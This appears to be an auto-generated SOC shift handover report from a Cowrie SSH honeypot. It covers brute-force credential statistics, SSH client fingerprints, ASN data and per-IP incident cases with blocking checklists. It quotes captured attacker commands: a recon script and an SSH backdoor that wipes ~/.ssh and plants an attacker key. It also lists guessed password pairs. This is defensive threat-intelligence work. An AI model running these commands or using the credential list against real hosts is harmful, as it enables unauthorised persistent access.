# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-23 |
| **Generated At** | 2026-08-23T20:28:15Z |
| **Shift Time** | 20:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **221** |
| Confirmed Threats | **212** |
| False Positives Filtered | **9** (4.1%) |
| Unique Attacker IPs | **77** |
| Countries of Origin | **28** |
| High Severity Cases | **102** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **119** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **117** |
| Unique Credential Pairs | **73** |
| Unique Usernames | **12** |
| Unique Passwords | **72** |
| Successful Auth Pairs | **110** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 53 |
| `ubuntu` | 15 |
| `user` | 12 |
| `nobody` | 9 |
| `default` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `nobody2011` | 6 |
| `user2009` | 5 |
| `default2024` | 5 |
| `support` | 4 |
| `root2002` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `nobody` | `nobody2011` | 6 |
| `user` | `user2009` | 5 |
| `default` | `default2024` | 5 |
| `support` | `support` | 4 |
| `root` | `root2002` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `Tech@2024` | `217.60.255.130` | 2026-08-23T16:56:20 |
| `root` | `changeme2011` | `217.60.255.130` | 2026-08-23T16:56:24 |
| `support` | `support` | `176.53.159.196` | 2026-08-23T16:57:31 |
| `user` | `user2009` | `182.75.197.174` | 2026-08-23T17:02:36 |
| `user` | `user2009` | `83.255.102.217` | 2026-08-23T17:02:44 |
| `ubuntu` | `123456aA` | `217.60.255.130` | 2026-08-23T17:05:43 |
| `root` | `Information@1234` | `217.60.255.130` | 2026-08-23T17:05:46 |
| `default` | `default2024` | `10.0.0.73` | 2026-08-23T17:08:32 |
| `root` | `root2002` | `196.188.187.85` | 2026-08-23T17:08:36 |
| `root` | `root2002` | `114.98.63.18` | 2026-08-23T17:08:46 |
| `root` | `root2002` | `182.78.93.42` | 2026-08-23T17:08:48 |
| `root` | `root2002` | `177.174.89.99` | 2026-08-23T17:08:57 |
| `default` | `default2024` | `122.187.147.13` | 2026-08-23T17:10:11 |
| `user` | `user2009` | `10.0.0.73` | 2026-08-23T17:13:38 |
| `ubuntu` | `qaz123wsx` | `217.60.255.130` | 2026-08-23T17:15:16 |
| `root` | `Sandhya@123` | `217.60.255.130` | 2026-08-23T17:15:20 |
| `root` | `1qazxsw23edc!@#` | `50.6.228.111` | 2026-08-23T17:18:23 |
| `345gs5662d34` | `345gs5662d34` | `50.6.228.111` | 2026-08-23T17:18:24 |
| `root` | `3245gs5662d34` | `50.6.228.111` | 2026-08-23T17:18:25 |
| `support` | `support` | `10.0.0.73` | 2026-08-23T17:22:13 |
| `nobody` | `nobody2011` | `10.0.0.73` | 2026-08-23T17:23:25 |
| `ubuntu` | `oscar@1234` | `217.60.255.130` | 2026-08-23T17:24:41 |
| `root` | `Rani@123` | `217.60.255.130` | 2026-08-23T17:24:44 |
| `default` | `default2024` | `112.94.5.43` | 2026-08-23T17:25:20 |
| `default` | `default2024` | `119.152.102.54` | 2026-08-23T17:25:29 |
| `ubuntu` | `testtest` | `190.181.25.210` | 2026-08-23T17:29:44 |
| `345gs5662d34` | `345gs5662d34` | `190.181.25.210` | 2026-08-23T17:29:47 |
| `ubuntu` | `3245gs5662d34` | `190.181.25.210` | 2026-08-23T17:29:48 |
| `user` | `user2009` | `121.178.185.141` | 2026-08-23T17:29:48 |
| `user` | `user2009` | `176.204.245.251` | 2026-08-23T17:29:57 |
| `ubuntu` | `Piyush@123` | `217.60.255.130` | 2026-08-23T17:34:09 |
| `root` | `Subham@123` | `217.60.255.130` | 2026-08-23T17:34:13 |
| `config` | `config2016` | `106.13.137.17` | 2026-08-23T17:34:46 |
| `config` | `config2016` | `160.30.39.50` | 2026-08-23T17:34:55 |
| `nobody` | `nobody2011` | `113.108.88.121` | 2026-08-23T17:40:55 |
| `nobody` | `nobody2011` | `178.224.53.154` | 2026-08-23T17:40:59 |
| `nobody` | `nobody2011` | `122.163.121.233` | 2026-08-23T17:41:03 |
| `nobody` | `nobody2002` | `10.0.0.73` | 2026-08-23T17:41:05 |
| `nobody` | `nobody2011` | `111.92.107.115` | 2026-08-23T17:41:07 |
| `nobody` | `nobody2002` | `187.91.166.143` | 2026-08-23T17:42:35 |
| `nobody` | `nobody2002` | `113.200.216.246` | 2026-08-23T17:42:44 |
| `ubuntu` | `dbadmin@123` | `217.60.255.130` | 2026-08-23T17:43:33 |
| `root` | `Pardeep@123` | `217.60.255.130` | 2026-08-23T17:43:37 |
| `ubuntu` | `Password@2025` | `217.60.255.130` | 2026-08-23T17:53:11 |
| `root` | `Ran@123` | `217.60.255.130` | 2026-08-23T17:53:15 |
| `root` | `Qd123456` | `58.229.253.119` | 2026-08-23T17:57:38 |
| `345gs5662d34` | `345gs5662d34` | `58.229.253.119` | 2026-08-23T17:57:41 |
| `root` | `3245gs5662d34` | `58.229.253.119` | 2026-08-23T17:57:43 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-23T17:58:45 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-23T17:58:46 |
| `root` | `123P@ssw0rd` | `152.32.212.226` | 2026-08-23T18:00:27 |
| `345gs5662d34` | `345gs5662d34` | `152.32.212.226` | 2026-08-23T18:00:31 |
| `root` | `3245gs5662d34` | `152.32.212.226` | 2026-08-23T18:00:33 |
| `config` | `config2016` | `181.87.154.121` | 2026-08-23T18:01:46 |
| `config` | `config2016` | `111.70.23.231` | 2026-08-23T18:01:54 |
| `ubuntu` | `Technology@2023` | `217.60.255.130` | 2026-08-23T18:02:38 |
| `root` | `Mannu@123` | `217.60.255.130` | 2026-08-23T18:02:42 |
| `root` | `erzqbYDZac` | `120.24.204.171` | 2026-08-23T18:02:52 |
| `root` | `000000` | `92.118.39.14` | 2026-08-23T18:12:02 |
| `ubuntu` | `Hello` | `217.60.255.130` | 2026-08-23T18:12:40 |
| `root` | `Bhardwaj@123` | `217.60.255.130` | 2026-08-23T18:12:44 |
| `root` | `root2012` | `117.32.132.170` | 2026-08-23T18:12:58 |
| `root` | `root2012` | `179.184.85.167` | 2026-08-23T18:13:06 |
| `root` | `root2012` | `38.199.201.3` | 2026-08-23T18:13:10 |
| `root` | `root2012` | `201.28.234.10` | 2026-08-23T18:13:21 |
| `centos` | `centos2003` | `10.0.0.73` | 2026-08-23T18:13:44 |
| `root` | `111111` | `92.118.39.14` | 2026-08-23T18:14:03 |
| `centos` | `centos2003` | `190.75.248.87` | 2026-08-23T18:15:09 |
| `centos` | `centos2003` | `114.30.223.119` | 2026-08-23T18:15:23 |
| `root` | `123` | `92.118.39.14` | 2026-08-23T18:16:04 |
| `root` | `123123` | `92.118.39.14` | 2026-08-23T18:18:03 |
| `root` | `123321` | `92.118.39.14` | 2026-08-23T18:20:01 |
| `root` | `1234` | `92.118.39.14` | 2026-08-23T18:21:56 |
| `ubuntu` | `afra@net` | `217.60.255.130` | 2026-08-23T18:22:15 |
| `root` | `Najmul@123` | `217.60.255.130` | 2026-08-23T18:22:19 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `35.203.210.237` | 2026-08-23T18:22:38 |
| `root` | `12345` | `92.118.39.14` | 2026-08-23T18:23:46 |
| `root` | `1234567` | `92.118.39.14` | 2026-08-23T18:27:28 |
| `user` | `user2010` | `10.0.0.73` | 2026-08-23T18:27:31 |
| `root` | `12345678` | `92.118.39.14` | 2026-08-23T18:29:22 |
| `centos` | `centos2003` | `103.147.248.23` | 2026-08-23T18:30:43 |
| `root` | `123456789` | `92.118.39.14` | 2026-08-23T18:31:18 |
| `ubuntu` | `Adm!n@1234` | `217.60.255.130` | 2026-08-23T18:31:49 |
| `root` | `green@123` | `217.60.255.130` | 2026-08-23T18:31:53 |
| `root` | `1234567890` | `92.118.39.14` | 2026-08-23T18:33:17 |
| `admin` | `admin2017` | `181.119.64.79` | 2026-08-23T18:33:46 |
| `admin` | `admin2017` | `113.158.205.225` | 2026-08-23T18:34:00 |
| `root` | `123456a` | `92.118.39.14` | 2026-08-23T18:35:20 |
| `root` | `123456b` | `92.118.39.14` | 2026-08-23T18:37:24 |
| `user` | `user2003` | `178.178.194.137` | 2026-08-23T18:38:35 |
| `user` | `user2003` | `60.174.39.82` | 2026-08-23T18:38:43 |
| `root` | `123abc` | `92.118.39.14` | 2026-08-23T18:39:22 |
| `ubuntu` | `oracle@123` | `217.60.255.130` | 2026-08-23T18:41:17 |
| `root` | `123qwe` | `92.118.39.14` | 2026-08-23T18:41:19 |
| `root` | `Anwar@123` | `217.60.255.130` | 2026-08-23T18:41:21 |
| `root` | `1q2w3e4r` | `92.118.39.14` | 2026-08-23T18:43:15 |
| `user` | `user2010` | `218.248.19.102` | 2026-08-23T18:44:57 |
| `user` | `user2010` | `159.224.97.134` | 2026-08-23T18:45:04 |
| `root` | `555555` | `92.118.39.14` | 2026-08-23T18:45:05 |
| `ubnt` | `ubnt2020` | `10.0.0.73` | 2026-08-23T18:46:04 |
| `root` | `654321` | `92.118.39.14` | 2026-08-23T18:46:52 |
| `ubnt` | `ubnt2020` | `190.60.37.146` | 2026-08-23T18:47:35 |
| `ubnt` | `ubnt2020` | `61.145.250.147` | 2026-08-23T18:47:43 |
| `root` | `7777777` | `92.118.39.14` | 2026-08-23T18:48:44 |
| `user` | `user2003` | `10.0.0.73` | 2026-08-23T18:49:35 |
| `root` | `abc123` | `92.118.39.14` | 2026-08-23T18:50:41 |
| `ubuntu` | `Allah786` | `217.60.255.130` | 2026-08-23T18:51:01 |
| `root` | `admin12` | `217.60.255.130` | 2026-08-23T18:51:06 |
| `root` | `admin` | `92.118.39.14` | 2026-08-23T18:52:44 |
| `root` | `admin123` | `92.118.39.14` | 2026-08-23T18:54:56 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **221** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 47 |
| OpenSSH | 36 |
| Go SSH scanner | 30 |
| Paramiko (Python) | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 36 | 36 |
| `419da4c91ddb...` | Modern SSH client | 26 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 23 | 1 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 36 | 36 | Mirai/variant |
| `419da4c91ddb...` | libssh | 26 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 23 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 4 | — |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 22 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `50.6.228.111`, `190.181.25.210`, `152.32.212.226`, `58.229.253.119`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **77** |
| Unique ASNs | **59** |
| High-Risk ASNs | **54** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS58224` | Iran Telecommunication Company PJS | 3 | HIGH |
| `AS52468` | UFINET PANAMA S.A. | 3 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 3 | HIGH |
| `AS1257` | Tele2 Sverige AB | 2 | HIGH |
| `AS202425` | IP Volume inc | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (101)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b028d3ace56e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 16:56 |
| **Last Seen** | 2026-08-23 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:56:19` | `cowrie.session.connect` |
| `2026-08-23 16:56:19` | `cowrie.client.version` |
| `2026-08-23 16:56:19` | `cowrie.client.kex` |
| `2026-08-23 16:56:20` | `cowrie.login.success` |
| `2026-08-23 16:56:20` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:56:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 16:56:20` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa7d8440b30d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 16:56 |
| **Last Seen** | 2026-08-23 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:56:23` | `cowrie.session.connect` |
| `2026-08-23 16:56:23` | `cowrie.client.version` |
| `2026-08-23 16:56:23` | `cowrie.client.kex` |
| `2026-08-23 16:56:24` | `cowrie.login.success` |
| `2026-08-23 16:56:24` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:56:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 16:56:25` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e76d32f05ec0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 16:57 |
| **Last Seen** | 2026-08-23 16:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:57:31` | `cowrie.session.connect` |
| `2026-08-23 16:57:31` | `cowrie.client.version` |
| `2026-08-23 16:57:31` | `cowrie.client.kex` |
| `2026-08-23 16:57:31` | `cowrie.login.success` |
| `2026-08-23 16:57:31` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:57:31` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:57:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2a2b887509f

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-08-23 17:02 |
| **Last Seen** | 2026-08-23 17:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:02:32` | `cowrie.session.connect` |
| `2026-08-23 17:02:33` | `cowrie.client.version` |
| `2026-08-23 17:02:33` | `cowrie.client.kex` |
| `2026-08-23 17:02:36` | `cowrie.login.success` |
| `2026-08-23 17:02:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca3ef4db7ec

| Field | Detail |
|---|---|
| **Source IP** | `83.255.102[.]217` |
| **First Seen** | 2026-08-23 17:02 |
| **Last Seen** | 2026-08-23 17:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:02:42` | `cowrie.session.connect` |
| `2026-08-23 17:02:42` | `cowrie.client.version` |
| `2026-08-23 17:02:42` | `cowrie.client.kex` |
| `2026-08-23 17:02:44` | `cowrie.login.success` |
| `2026-08-23 17:02:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.255.102[.]217` to AbuseIPDB if not already reported
- [ ] Block `83.255.102[.]217` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ac55852aa1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 17:05 |
| **Last Seen** | 2026-08-23 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:05:42` | `cowrie.session.connect` |
| `2026-08-23 17:05:42` | `cowrie.client.version` |
| `2026-08-23 17:05:42` | `cowrie.client.kex` |
| `2026-08-23 17:05:43` | `cowrie.login.success` |
| `2026-08-23 17:05:43` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:05:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 17:05:43` | `cowrie.direct-tcpip.data` |
| `2026-08-23 17:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60ae45306d0c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 17:05 |
| **Last Seen** | 2026-08-23 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:05:45` | `cowrie.session.connect` |
| `2026-08-23 17:05:45` | `cowrie.client.version` |
| `2026-08-23 17:05:46` | `cowrie.client.kex` |
| `2026-08-23 17:05:46` | `cowrie.login.success` |
| `2026-08-23 17:05:47` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:05:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 17:05:47` | `cowrie.direct-tcpip.data` |
| `2026-08-23 17:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cf0afe7f337

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]85` |
| **First Seen** | 2026-08-23 17:08 |
| **Last Seen** | 2026-08-23 17:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:08:33` | `cowrie.session.connect` |
| `2026-08-23 17:08:34` | `cowrie.client.version` |
| `2026-08-23 17:08:34` | `cowrie.client.kex` |
| `2026-08-23 17:08:36` | `cowrie.login.success` |
| `2026-08-23 17:08:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]85` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]85` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e572ba5a4942

| Field | Detail |
|---|---|
| **Source IP** | `114.98.63[.]18` |
| **First Seen** | 2026-08-23 17:08 |
| **Last Seen** | 2026-08-23 17:08 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:08:42` | `cowrie.session.connect` |
| `2026-08-23 17:08:43` | `cowrie.client.version` |
| `2026-08-23 17:08:43` | `cowrie.client.kex` |
| `2026-08-23 17:08:46` | `cowrie.login.success` |
| `2026-08-23 17:08:47` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.63[.]18` to AbuseIPDB if not already reported
- [ ] Block `114.98.63[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3dd11226501

| Field | Detail |
|---|---|
| **Source IP** | `182.78.93[.]42` |
| **First Seen** | 2026-08-23 17:08 |
| **Last Seen** | 2026-08-23 17:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:08:45` | `cowrie.session.connect` |
| `2026-08-23 17:08:46` | `cowrie.client.version` |
| `2026-08-23 17:08:46` | `cowrie.client.kex` |
| `2026-08-23 17:08:48` | `cowrie.login.success` |
| `2026-08-23 17:08:49` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:08:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.78.93[.]42` to AbuseIPDB if not already reported
- [ ] Block `182.78.93[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f85f0c76dde

| Field | Detail |
|---|---|
| **Source IP** | `177.174.89[.]99` |
| **First Seen** | 2026-08-23 17:08 |
| **Last Seen** | 2026-08-23 17:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:08:54` | `cowrie.session.connect` |
| `2026-08-23 17:08:55` | `cowrie.client.version` |
| `2026-08-23 17:08:55` | `cowrie.client.kex` |
| `2026-08-23 17:08:57` | `cowrie.login.success` |
| `2026-08-23 17:08:57` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.89[.]99` to AbuseIPDB if not already reported
- [ ] Block `177.174.89[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89a29f2f9aeb

| Field | Detail |
|---|---|
| **Source IP** | `122.187.147[.]13` |
| **First Seen** | 2026-08-23 17:10 |
| **Last Seen** | 2026-08-23 17:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:10:07` | `cowrie.session.connect` |
| `2026-08-23 17:10:08` | `cowrie.client.version` |
| `2026-08-23 17:10:08` | `cowrie.client.kex` |
| `2026-08-23 17:10:11` | `cowrie.login.success` |
| `2026-08-23 17:10:12` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.147[.]13` to AbuseIPDB if not already reported
- [ ] Block `122.187.147[.]13` at perimeter firewall / security group
